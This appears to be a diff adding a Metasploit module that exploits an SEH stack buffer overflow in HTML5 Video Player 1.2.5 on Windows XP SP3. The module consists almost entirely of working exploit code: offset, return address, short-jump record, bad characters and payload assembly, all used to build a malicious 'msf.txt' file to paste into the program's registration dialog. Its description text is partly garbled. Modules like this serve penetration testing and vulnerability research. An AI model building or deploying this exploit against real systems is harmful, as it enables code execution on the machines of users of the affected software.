@@ -1,0 +1,73 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'    => 'HTML5 Video Player 1.2.5 - Buffer Overflow (SEH)',
+      'Description'  => %q{
+          This module exploits a stack based buffer overflow in HTML5 Video Player 1.2.5 , when
+          with the name "msf.txt". 1.file with the name "msf.txt" and copy content to clipboard ,2.Open software, click Help > Register and paste "Username" click "OK".
+      },
+      'License'    => MSF_LICENSE,
+      'Author'    =>
+        [ 
+          'T3jv1l',                       # Original discovery
+          'Kağan Çapar',                  # Original discovery
+          'd3ckx1 d3ck(at)qq.com',       # MSF module
+        ],
+      'References'  =>
+        [
+          [ 'OSVDB', '' ],
+          [ 'EBD', '45888' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Platform'  => 'win',
+      'Payload'   =>
+        {
+          'BadChars'    => "\x00\x0a\x0d\x1a",
+          'DisableNops' => true,
+          'Space'       => 4000
+        },
+      'Targets'   =>
+        [
+          [ 'HTML Video Player 1.2.5',
+            {
+              'Ret'     =>  0x7C901931, # 0x7C901931 : P/P/R FROM ntdll.dll form winxp sp3
+              'Offset'  =>  1984
+            }
+          ],
+        ],
+      'Privileged'  => false,
+      'DisclosureDate'  => 'Nov 22 2018',
+      'DefaultTarget'  => 0))
+
+    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.txt']),], self.class)
+
+  end
+
+  def exploit
+    buf = "\x41"*(target['Offset'])
+    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
+    buf << [target.ret] .pack('V')  # seh
+    buf << make_nops(30)
+    buf << payload.encoded
+    buf << "\x90" * 300
+
+    file_create(buf)
+    handler
+    
+  end
+end
